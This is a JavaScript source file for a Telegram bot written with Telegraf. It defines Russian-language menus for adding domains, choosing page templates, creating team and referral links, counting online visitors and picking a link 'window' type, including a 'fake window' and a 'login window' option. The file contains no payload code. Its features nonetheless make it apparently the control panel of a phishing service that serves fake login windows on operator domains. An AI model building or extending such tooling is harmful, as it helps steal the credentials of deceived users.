const { Markup } = require("telegraf");
const { btn } = require("../utils/emoji");
const { getLinkParamDefs } = require("../utils/referral");

function sitesKeyboard(domains = [], ownerId = null) {
  return Markup.inlineKeyboard([
    ...domains.slice(0, 15).map((domain) => {
      const online = Number(domain.online || 0);
      const team =
        domain?.isTeamPublic === true &&
        ownerId != null &&
        Number(domain.owner) !== Number(ownerId);
      const parts = [domain.domain];
      if (team) parts.push("командный");
      if (online > 0) parts.push(`${online} онлайн`);
      return [btn(parts.join(" · ").slice(0, 64), `sites:domain:${domain.id}`, "link")];
    }),
    [btn("Добавить домен", "sites:add", "upload")],
    [btn("Добавить шаблон", "sites:template:add", "code")],
    [btn("Назад", "menu:home", "home")],
  ]);
}

function sitesBindConfirmKeyboard() {
  return Markup.inlineKeyboard([
    [btn("Добавить домен", "sites:bind:confirm:IP", "success")],
    [btn("Отменить", "sites:cancel", "error")],
  ]);
}

function templatePublicKeyboard() {
  return Markup.inlineKeyboard([
    [
      btn("Публичный", "sites:template:public:1", "visible"),
      btn("Приватный", "sites:template:public:0", "hidden"),
    ],
    [btn("Отменить", "sites:cancel", "error")],
  ]);
}

function domainLinksKeyboard(domainId, links = [], { team = false } = {}) {
  const rows = [
    ...links
      .slice(0, 10)
      .map((link) => [
        btn(
          `/${link.path || "random"} · ${link.template?.name || "без шаблона"}`.slice(0, 60),
          `sites:link:open:${domainId}:${link.id}`,
          "link"
        ),
      ]),
  ];
  // На командном домене ссылка создаётся только через «Реферальная ссылка».
  if (!team) {
    rows.push([btn("Создать ссылку", `sites:link_create:${domainId}`, "link")]);
    rows.push([btn("Удалить домен", `sites:domain:delete:${domainId}`, "delete")]);
  }
  if (team) {
    rows.push([btn("Реферальная ссылка", `sites:ref:${domainId}`, "gift")]);
  }
  rows.push([btn("Назад", "menu:sites", "home")]);
  return Markup.inlineKeyboard(rows);
}

function domainDeleteConfirmKeyboard(domainId) {
  return Markup.inlineKeyboard([
    [btn("Да, удалить", `sites:domain:delete:ok:${domainId}`, "error")],
    [btn("Отмена", `sites:domain:${domainId}`, "home")],
  ]);
}

function teamDomainKeyboard(domainId, links = []) {
  return domainLinksKeyboard(domainId, links, { team: true });
}

function linkCreatorKeyboard(domainId, state) {
  const windows = {
    FakeWindow: "Фейк-окно",
    CurrentWindow: "Текущее окно",
    NewWindow: "Новое окно",
    AboutBlank: "About:Blank",
  };
  return Markup.inlineKeyboard([
    [btn(`Адрес: ${state.path ? `/${state.path}` : "необязательно"}`, "sites:link:path", "link")],
    [btn(`Шаблон: ${state.templateName || "не выбран"}`, "sites:link:template", "file")],
    [btn(`Окно: ${windows[state.windowType] || state.windowType}`, "sites:link:window", "settings")],
    [btn("Создать ссылку", `sites:link:create:${domainId}`, "success")],
    [btn("Отменить", "sites:cancel", "error")],
    [btn("Назад", `sites:domain:${domainId}`, "home")],
  ]);
}

function linkWindowTypeKeyboard() {
  return Markup.inlineKeyboard([
    [
      btn("Фейк-окно", "sites:window:FakeWindow", "visible"),
      btn("Текущее окно", "sites:window:CurrentWindow", "visible"),
    ],
    [
      btn("Новое окно", "sites:window:NewWindow", "link"),
      btn("About:Blank", "sites:window:AboutBlank", "file"),
    ],
    [btn("Назад", "sites:link:editor", "home")],
  ]);
}

function templatesKeyboard(templates = []) {
  return Markup.inlineKeyboard([
    ...templates
      .slice(0, 15)
      .map((template) => [
        btn(
          `${template.name || template.id} · #${template.id}`.slice(0, 60),
          `sites:template:${template.id}`,
          "file"
        ),
      ]),
    [btn("Поиск по ID", "sites:link:template:search", "edit")],
    [btn("Назад", "sites:link:editor", "home")],
  ]);
}

function referralLinkKeyboard(domainId) {
  return Markup.inlineKeyboard([
    [btn("Обновить", `sites:ref:refresh:${domainId}`, "loading")],
    [btn("Параметры", `sites:ref:params:${domainId}`, "settings")],
    [
      btn("Шаблон", `sites:ref:template:${domainId}`, "file"),
      btn("Окно входа", `sites:ref:window:${domainId}`, "visible"),
    ],
    [btn("Удалить ссылку", `sites:ref:delete:ask:${domainId}`, "delete")],
    [btn("Назад", `sites:domain:${domainId}`, "home")],
  ]);
}

function referralDeleteConfirmKeyboard(domainId) {
  return Markup.inlineKeyboard([
    [
      btn("Да, удалить", `sites:ref:delete:ok:${domainId}`, "error"),
      btn("Отмена", `sites:ref:back:${domainId}`, "home"),
    ],
  ]);
}

function referralParamsKeyboard(domainId, row = {}) {
  const rows = getLinkParamDefs(row).map((param) => [
    btn(
      `${param.value ? "Вкл ·" : "Выкл ·"} ${param.label}`.slice(0, 64),
      `sites:ref:param:${domainId}:${param.key}`,
      param.value ? "success" : "settings"
    ),
  ]);
  rows.push([btn("Назад", `sites:ref:back:${domainId}`, "home")]);
  return Markup.inlineKeyboard(rows);
}

function referralTemplatesKeyboard(domainId, templates = []) {
  return Markup.inlineKeyboard([
    ...templates
      .slice(0, 15)
      .map((template) => [
        btn(
          `${template.name || template.id} · #${template.id}`.slice(0, 60),
          `sites:ref:template:set:${domainId}:${template.id}`,
          "file"
        ),
      ]),
    [btn("Поиск по ID", `sites:ref:template:search:${domainId}`, "edit")],
    [btn("Назад", `sites:ref:back:${domainId}`, "home")],
  ]);
}

function referralCreateTemplatesKeyboard(domainId, templates = []) {
  return Markup.inlineKeyboard([
    ...templates
      .slice(0, 12)
      .map((template) => [
        btn(
          `${template.name || template.id} · #${template.id}`.slice(0, 60),
          `sites:ref:create:tpl:${domainId}:${template.id}`,
          "file"
        ),
      ]),
    [btn("Создать свой", `sites:ref:create:tpl:new:${domainId}`, "code")],
    [btn("Поиск по ID", `sites:ref:create:tpl:search:${domainId}`, "edit")],
    [btn("Отменить", "sites:cancel", "error")],
  ]);
}

function referralCreateWindowKeyboard(domainId) {
  return Markup.inlineKeyboard([
    [
      btn("Фейк-окно", `sites:ref:create:win:${domainId}:FakeWindow`, "visible"),
      btn("Текущее окно", `sites:ref:create:win:${domainId}:CurrentWindow`, "visible"),
    ],
    [
      btn("Новое окно", `sites:ref:create:win:${domainId}:NewWindow`, "link"),
      btn("About:Blank", `sites:ref:create:win:${domainId}:AboutBlank`, "file"),
    ],
    [btn("Отменить", "sites:cancel", "error")],
  ]);
}

function referralWindowKeyboard(domainId) {
  return Markup.inlineKeyboard([
    [
      btn("Фейк-окно", `sites:ref:win:${domainId}:FakeWindow`, "visible"),
      btn("Текущее окно", `sites:ref:win:${domainId}:CurrentWindow`, "visible"),
    ],
    [
      btn("Новое окно", `sites:ref:win:${domainId}:NewWindow`, "link"),
      btn("About:Blank", `sites:ref:win:${domainId}:AboutBlank`, "file"),
    ],
    [btn("Назад", `sites:ref:back:${domainId}`, "home")],
  ]);
}

module.exports = {
  sitesKeyboard,
  sitesBindConfirmKeyboard,
  templatePublicKeyboard,
  domainLinksKeyboard,
  domainDeleteConfirmKeyboard,
  teamDomainKeyboard,
  linkCreatorKeyboard,
  linkWindowTypeKeyboard,
  templatesKeyboard,
  referralLinkKeyboard,
  referralParamsKeyboard,
  referralWindowKeyboard,
  referralTemplatesKeyboard,
  referralCreateTemplatesKeyboard,
  referralCreateWindowKeyboard,
  referralDeleteConfirmKeyboard,
};
